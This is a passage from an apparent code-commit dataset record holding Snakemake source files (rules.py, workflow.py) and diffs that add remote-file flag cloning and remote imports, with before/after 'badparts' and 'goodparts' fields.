self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = \"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"},"\/snakemake\/remote_providers\/__init__.py":{"changes":[{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]},{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]}]},"\/snakemake\/rules.py":{"changes":[{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]},{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"},"\/snakemake\/workflow.py":{"changes":[{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]},{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise 